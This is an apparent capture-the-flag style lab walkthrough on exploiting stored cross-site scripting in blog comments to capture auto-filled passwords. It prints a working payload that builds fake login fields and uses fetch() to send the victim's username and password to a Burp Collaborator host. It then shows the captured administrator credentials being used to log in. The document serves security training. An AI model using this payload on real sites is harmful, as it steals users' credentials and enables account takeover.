- These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.
- This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.
- The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)

## Steps to solve lab
### Title - Exploiting cross-site scripting to capture passwords

**Desc** - This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**Our end goal** - To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

1. Analyze the page and as per the lab description there is a vulnerability in the blog comments function.
![[XSS93.png]]

![[XSS94.png]]
As you can see above, our tag is not sanitized it means we can execute javascript.

2. Now, copy the below payload and paste it into the "comment" box.
**Payload** - 
```jsx
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ 
method:'POST', 
mode: 'no-cors', 
body:username.value+':'+this.value 
});">
```

**Explaination to above code** - 

1. `fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {...});`: 
	- This line initiates an HTTP request to the URL `'https://BURP-COLLABORATOR-SUBDOMAIN'`. Replace `'https://BURP-COLLABORATOR-SUBDOMAIN'` with the actual URL you want to target. This URL is where the data will be sent.

2. `method: 'POST'`:
	- This specifies the HTTP request method as POST. In the context of web requests, a POST request is often used to send data to a server.

3. `mode: 'no-cors'`:
	- This sets the request mode to 'no-cors'. The 'no-cors' mode is used for requests where you do not need to access the response from the server, and it's mainly used to avoid certain security restrictions, such as the same-origin policy.
	- However, it also means that you won't be able to access the response from the server, including any error messages.

![[XSS101.png]]

![[XSS102.png]]
As you can see above, we got the password and username of the victim. It means, it is that user that viewed our comment on the blog and we successfully steal the username and password of that user.

**In burp collaborator** - 
![[XSS103.png]]
username - administrator
password - 95buhjbcwmln88g841ud

3. Now, login with these credentials.
![[XSS104.png]]

For better understanding visit --> [[Exploiting Cross-site Scripting to Capture Passwords (No Collaborator).mp4]]

